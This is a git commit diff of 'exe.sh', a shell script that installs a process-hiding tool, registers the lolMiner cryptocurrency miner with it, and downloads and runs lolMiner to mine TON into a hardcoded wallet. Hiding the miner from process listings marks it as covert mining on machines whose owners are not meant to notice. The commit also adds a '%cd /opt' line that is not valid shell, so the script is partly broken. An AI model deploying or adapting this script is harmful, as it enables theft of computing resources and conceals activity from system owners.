fca1c18b68298648cedfedd9f2337eae1e8394cc
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-26 20:19:16 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,11 +1,10 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-screen -dmS gpu.sh ./gpu.sh 79 95
+screen -dmS gpu.sh ./gpu.sh 89 95
+%cd /opt
 sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz && tar xvf lolMiner_v1.41b_Lin64.tar.gz && mv 1.41b mng && cd mng && chmod +x lolMiner
-while [ 1 ]; do
-./lolMiner --algo TON --pool https://pool.services.tonwhales.com --user EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
-sleep 5
-
-done
+sudo apt install libpci3
+sudo apt-get install screen
+wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz
+./1.42/lolMiner -a TON -p https://next.ton-pool.com -u EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi --apiport 4444
